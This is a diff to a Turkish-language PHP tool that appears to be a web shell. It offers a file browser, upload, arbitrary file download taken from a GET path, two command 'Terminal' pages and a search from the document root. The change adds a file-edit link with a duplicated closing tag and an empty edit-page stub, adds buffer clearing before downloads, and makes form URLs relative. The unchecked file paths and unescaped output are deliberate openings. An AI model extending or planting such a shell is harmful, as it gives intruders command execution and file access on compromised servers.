@@ -174,7 +174,7 @@
                 if (is_dir($fullPath)) {
                     echo "<li><strong>Klasör:</strong> $entry (İzin: $filePermission) <a href='?page=filemanager&directory=" . urlencode($fullPath) . "'>Görüntüle</a> </li>";
                 } else {
-                    echo "<li><strong>Dosya:</strong> $entry (İzin: $filePermission) <a href='?page=download&file=" . urlencode($fullPath) . "'>İndir</a> <a href='?page=filemanager&delete=" . urlencode($fullPath) . "' onclick=\"return confirm('Bu dosyayı silmek istediğinizden emin misiniz?')\">Sil</a></li>";
+                    echo "<li><strong>Dosya:</strong> $entry (İzin: $filePermission) <a href='?page=download&file=" . urlencode($fullPath) . "'>İndir</a> <a href='?page=filemanager&delete=" . urlencode($fullPath) . "' onclick=\"return confirm('Bu dosyayı silmek istediğinizden emin misiniz?')\">Sil</a> <a href='?page=editfile&file=" . urlencode($fullPath) . "'>Düzenle</a></li>  </li>";
                 }
             }
         }
@@ -185,7 +185,7 @@
 
 
         echo '<h2>Dosya Yükle</h2>';
-        echo '<form action="index.php?page=filemanager" method="post" enctype="multipart/form-data">';
+        echo '<form action="?page=filemanager" method="post" enctype="multipart/form-data">';
         echo '<label for="fileToUpload">Yüklemek için dosya seçin:</label>';
         echo '<input type="file" class="btn" name="fileToUpload" id="fileToUpload">';
         echo '<input type="hidden" name="directory" value="' . $dir_path . '">';
@@ -232,6 +232,8 @@
             $filePath = $_GET['file'];
     
             if (file_exists($filePath)) {
+                // ob clean eklendi - output bufferi temizliği
+                ob_clean();
                 header('Content-Description: File Transfer');
                 header('Content-Type: application/octet-stream');
                 header('Content-Disposition: attachment; filename="' . basename($filePath) . '"');
@@ -271,7 +273,7 @@
         echo '<h2>Terminal</h2>';
         echo '<p>Klasik terminal v1, bu terminal çalışmazsa basit halini denemek için alttaki buton ile diğer terminale geçin.</p>';
         echo '<p> Bu terminalin çalışmayabiliyor olmasının sebebi post istekleri bazı yerlerde çalışmıyor ondan</p>';
-        echo '<form method="POST" action="index.php?page=terminal">';
+        echo '<form method="POST" action="?page=terminal">';
         echo '<label for="cmd"><strong>Command</strong></label>';
         echo '<div class="form-group">';
         echo '<input type="text" name="cmd" id="cmd" value="' . ($cmd ?? '') . '" onfocus="this.setSelectionRange(this.value.length, this.value.length);" autofocus required>';
@@ -286,7 +288,7 @@
         } else {
             echo '<pre><small>No result.</small></pre>';
         }
-        echo '<br><br><br><a href="index.php?page=terminalv2" class="btn2" >TerminalV2</a>';
+        echo '<br><br><br><a href="?page=terminalv2" class="btn2" >TerminalV2</a>';
     }
 
 
@@ -323,7 +325,7 @@
         echo '<h2>Dosya Arama</h2>';
     
         // Arama formu
-        echo '<form method="POST" action="index.php?page=filesearch">';
+        echo '<form method="POST" action="?page=filesearch">';
         echo '<label for="searchDirectory">Arama Yapılacak Dizin:</label>';
         echo '<input type="text" name="searchDirectory" id="searchDirectory" value="' . ($_POST['searchDirectory'] ?? $_SERVER["DOCUMENT_ROOT"]) . '" required>';
         echo '<br><label for="searchQuery">Aranacak Dosya Adı:</label>';
@@ -443,6 +445,11 @@
         echo '</pre>';
     }
 
+    function editfilePage() {
+    // Dosya düzenleme sayfası
+    
+}
+
 
     // Sayfayı seçip doğru fonksiyonu çağırıyoruz
     $page = $_GET['page'] ?? 'home'; // Varsayılan olarak 'home' sayfası yüklenecek
@@ -470,6 +477,9 @@
     }
     elseif ($page == 'terminalv2') {
         terminalv2Page();
+    }
+    elseif ($page == 'editfile') {
+        editfilePage();
     }
     else {
         echo '<h2>Sayfa Bulunamadı</h2>';
